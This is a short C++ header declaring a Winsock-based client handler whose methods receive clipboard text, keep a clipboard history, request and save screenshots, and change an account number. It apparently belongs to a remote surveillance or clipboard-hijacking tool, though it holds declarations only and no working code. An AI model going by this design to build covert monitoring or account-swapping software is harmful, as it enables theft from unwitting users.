#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include "Metadata.hh"
#include <vector>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include "SocketListener.hh"
#include <iostream>
#include "WinapiHelpers.hh"
#include "ClientHandler.hh"
#include "IpAddress.hh"
#include "Socket.hh"



#pragma comment(lib, "Ws2_32.lib")
class ClientHandler
{
public:
	explicit ClientHandler(SOCKET clientSocket);
	~ClientHandler();
	void RecvClipboardString(const Metadata& metadata);
	std::vector<char> RecvScreenshotAsJpgBytes(const Metadata& metadata);
	void SaveScreenshot(const std::vector<char>& screenshot);
	void Handle();
	void ChangeAccountNumber(std::string accountNumber);
	void GetScreenshotCmd();


private:
	SOCKET clientSocket;
	std::vector<std::string> clipboardContentHistory;
	IpAddress ipAddress;
	Socket socket;
};

